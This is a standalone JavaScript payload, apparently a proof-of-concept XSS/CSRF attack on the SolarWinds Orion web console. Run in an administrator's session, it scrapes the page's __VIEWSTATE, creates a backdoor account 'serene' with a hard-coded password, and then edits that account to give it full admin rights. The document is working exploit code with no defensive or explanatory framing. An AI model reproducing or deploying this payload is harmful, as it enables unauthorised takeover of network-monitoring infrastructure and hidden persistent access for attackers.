function getHtmlBody(url, ref)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open('GET', url, false);
    xmlHttp.send(null);
    var results = xmlHttp.responseText;
    var doc = document.implementation.createHTMLDocument('');
    doc.documentElement.innerHTML = results;
    return(doc);
}

function getViewState(doc)
{
    return(doc.getElementById("__VIEWSTATE"));
}


function SetAdmin(viewstate){
    var http = new XMLHttpRequest();
    var url = "/Orion/Admin/Accounts/EditAccount.aspx?AccountID=serene&AccountType=Edit";
    var params="__EVENTTARGET=ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24submitButton&__EVENTARGUMENT=&__VIEWSTATE=" + encodeURIComponent(viewstate) + "&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24checkboxesVisible=hidden&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynAccountEnabled%24listBox=true&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24txtAccountExpires=Never&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynDisableSessionTimeout%24listBox=false&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynAdminRights%24listBox=true&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynAllowNodeManagement%24listBox=false&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynCustomizeViews%24listBox=false&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynClearEvents%24listBox=true&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24ynBrowserIntegration%24listBox=false&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24lbxAlertSound=&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24tbBreadcrumbItems=50&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24tabBars%24tabBars%24ctl00%241%24menuBars=Default&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24tabBars%24tabBars%24ctl01%243%24menuBars=Network_TabMenu&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24tabBars%24tabBars%24ctl02%242%24menuBars=Virtualization_TabMenu&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24lbxHomePageView=1&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24lbxSummaryView=1&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24lbxReportFolder=%5CReports&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl00%24ctl00%24ctl08%24ctl00%24ctl00%24ctl01%24lbxNodeDetails=-1&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl00%24ctl00%24ctl08%24ctl00%24ctl01%24ctl01%24lbxVolumeDetails=3&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl00%24ctl00%24ctl08%24ctl00%24ctl02%24ctl01%24lbxNodeDetails=7&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl01%24ctl00%24ctl08%24ctl00%24ctl00%24ctl01%24lbxInterfaceDetails=14&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl01%24ctl00%24ctl08%24ctl00%24ctl01%24ctl01%24lbxVSANDetails=22&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl01%24ctl00%24ctl08%24ctl00%24ctl02%24ctl01%24lbxUCSChassisDetails=24&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl02%24ctl00%24ctl08%24ctl00%24ctl00%24ctl01%24ViewSelector%24lbxViewPicker=9&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl02%24ctl00%24ctl08%24ctl00%24ctl01%24ctl01%24ViewSelector%24lbxViewPicker=10&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24moduleSettings%24rptModules%24ctl02%24ctl00%24ctl08%24ctl00%24ctl02%24ctl01%24ViewSelector%24lbxViewPicker=11";
    http.open("POST", url, false);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-lenth", params.length);
    http.setRequestHeader("Connection", "close");
    http.send(params);
    var response = http.responseText;
    alert(response);
    var doc = document.implementation.createHTMLDocument('');
    doc.documentElement.innerHTML = response;
    return(doc);
}


function postCredentials(viewState)
{
    var http = new XMLHttpRequest();
    var url = "/Orion/Admin/Accounts/Add/OrionAccount.aspx?AccountType=Orion";
    var params="ctl00%24ctl00%24ctl00%24BodyContent%24ScriptManagerPlaceHolder%24MasterScriptManager=ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24UpdatePanel1%7Cctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24__CustomNav0%24ImageButton1&__EVENTTARGET=ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24__CustomNav0%24ImageButton1&__EVENTARGUMENT=&__VIEWSTATE=" + encodeURIComponent(viewState) +"&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24UserName=serene&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24Password=samsamsam&ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24ConfirmPassword=samsamsam&__ASYNCPOST=true&";
    http.open("POST", url, false);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-lenth", params.length);
    http.setRequestHeader("Connection", "close");
    http.send(params);
    var response = http.responseText;
    alert(response);
    var doc = document.implementation.createHTMLDocument('');
    doc.documentElement.innerHTML = response;
    return(doc);
}

var doc1 = getHtmlBody("/Orion/Admin/Accounts/Add/OrionAccount.aspx?AccountType=Orion");
var pageView=getViewState(doc1).value;
alert(pageView);
postCredentials(pageView);


var doc2 = getHtmlBody("/Orion/Admin/Accounts/EditAccount.aspx?AccountID=serene&AccountType=Edit");
var pageviews=getViewState(doc2).value;
SetAdmin(pageviews);

